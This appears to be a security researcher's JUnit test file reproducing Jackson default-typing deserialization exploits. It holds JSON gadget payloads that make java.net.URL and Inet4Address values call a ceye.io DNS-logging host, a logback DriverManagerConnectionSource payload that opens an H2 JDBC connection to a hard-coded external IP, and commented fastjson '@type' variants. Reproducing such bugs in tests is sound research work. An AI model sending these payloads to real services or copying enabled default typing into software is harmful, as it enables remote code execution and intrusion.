package com.jackson;

import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;

import org.junit.jupiter.api.Test;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * @author eonezhang (eonezhang@gmail.com)
 * @since 2020/8/3-1:41 PM
 */
public class JacksonBugTest {

    ObjectMapper mapper = new ObjectMapper();
    {
        mapper.enableDefaultTyping();
    }
    @Test
    void testJackson() throws JsonProcessingException {
//        String json = "{\"chen\":{{\"@type\":\"java.net.URL\",\"val\":\"http://jsrrrrrnew.1545t3.ceye.io\"}:\"x\"}\"}\n"
//                      + "{\"chen\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"jrrrr11ew.1545t3.ceye.io\"}}\n"
//                      + "{\"chen\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"jsrrr333ew.1545t3.ceye.io\"}}\n"
//                      + "{\"chen\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"rrtt5new.1545t3.ceye.io\"}}}\n"
//                      + "{\"chen\":{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"jttrr5ew.1545t3.ceye.io\"}}\"\"}}";

//        String json = "{\"chen\":{\"@type\":\"java.net.URL\",\"val\":\"http://jsrrrrrnew.1545t3.ceye.io\"}}";
//        String json = "{\"chen\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"jrrrr11ew.1545t3.ceye.io\"}}\n";
        String json = "[\"java.net.URL\", {\"val\":\"http://jsrrrrrnew.1545t3.ceye.io\"}]";
        System.out.printf("%s%n", json);
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        Object obj = objectMapper.readValue(json, Object.class);
        System.out.printf("%s", obj);

        String value = objectMapper.writeValueAsString(obj);
        System.out.printf("%n%s%n", value);
    }

    @Test
    void testBug2() throws JsonProcessingException {
        String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://139.196.103.119:9999/test\"}]";
        System.out.printf("%s%n", json);

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(obj);
    }

    @Test
    void testURL() throws MalformedURLException, JsonProcessingException {
        URI uri = URI.create("http://www.163.com/");
        URL url = uri.toURL();

        String value = mapper.writeValueAsString(url);
        System.out.println("value = " + value);

        String json = "{\"chen\":{\"@type\":\"java.net.Inet4Address\", \"val\":\"jrrrr11ew.1545t3.ceye.io\"}}";
        Object obj = mapper.readValue(json, Object.class);
        System.out.printf("%s%n", obj);
        json = mapper.writeValueAsString(obj);
        System.out.println("json = " + json);

    }
}
